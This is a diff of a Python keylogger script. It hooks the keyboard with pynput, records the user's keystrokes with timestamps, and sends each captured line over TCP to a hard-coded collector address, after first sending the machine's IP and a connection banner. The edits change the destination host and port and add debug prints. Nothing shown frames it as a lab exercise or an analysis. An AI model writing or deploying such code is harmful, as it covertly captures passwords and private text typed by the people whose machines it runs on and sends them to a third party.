@@ -2,30 +2,31 @@ from pynput import keyboard
 import time
 import socket
 
-TCP_IP = '192.168.0.10'
-TCP_PORT = 5005
-BUFFER_SIZE = 256   
+TCP_IP = '192.168.0.27' 
+TCP_PORT = 8099
+BUFFER_SIZE = 124       
 v = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 v.connect(("8.8.8.8", 80))
 ipAddr = v.getsockname()[0]
-# print(v.getsockname()[0])hello this is awesome amirite? 
+print(v.getsockname()[0])
 v.close()
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((TCP_IP, TCP_PORT))
+client.connect((TCP_IP, TCP_PORT))  
 l="Connection is Up and Running"
 n = "You are connected to: "+ipAddr
 client.send(l.encode())
-time.sleep(0.3)
-client.send(n.encode())
-# data = client.recv(BUFFER_SIZE).decode()
-# client.close()
-def on_release(key):
+time.sleep(0.3) 
+client.send(n.encode())     
+# data = client.recv(BUFFER_SIZE).decode()        
+client.close()
+def on_release(key):    
     letter = key
     if letter == keyboard.Key.tab:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((TCP_IP, TCP_PORT))
-        word = "Client has terminated connection"
+        word = "Client has terminated connection"   
         client.send(word.encode())
+        # print("\n"+client.send(word.encode()))               
         client.close()
         return False
 letters = []
@@ -47,6 +48,7 @@ def log(key):
         word = word+"  --  "+time_string
         print(word) 
         client.send(word.encode())
+        print(client.send(word.encode()))
         client.close()  
         del letters[:]
     
@@ -56,3 +58,4 @@ with keyboard.Listener(
         on_release=on_release
         ) as listener:
     listener.join() 
+    
